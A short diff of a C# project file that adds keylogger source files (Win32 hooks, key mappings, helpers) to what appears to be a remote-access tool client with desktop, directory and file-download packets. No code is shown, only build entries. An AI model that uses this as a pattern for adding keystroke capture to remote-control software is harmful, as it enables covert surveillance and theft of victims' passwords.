@@ -64,6 +64,10 @@
     <Compile Include="Core\Information\OSInfo.cs" />
     <Compile Include="Core\Compression\JpgCompression.cs" />
     <Compile Include="Core\Extensions\SocketExtensions.cs" />
+    <Compile Include="Core\Keylogger\KeyloggerAttributes.cs" />
+    <Compile Include="Core\Keylogger\KeyloggerHelpers.cs" />
+    <Compile Include="Core\Keylogger\KeyloggerKeys.cs" />
+    <Compile Include="Core\Keylogger\Win32.cs" />
     <Compile Include="Core\Packets\ClientPackets\DesktopResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DirectoryResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\DownloadFileResponse.cs" />
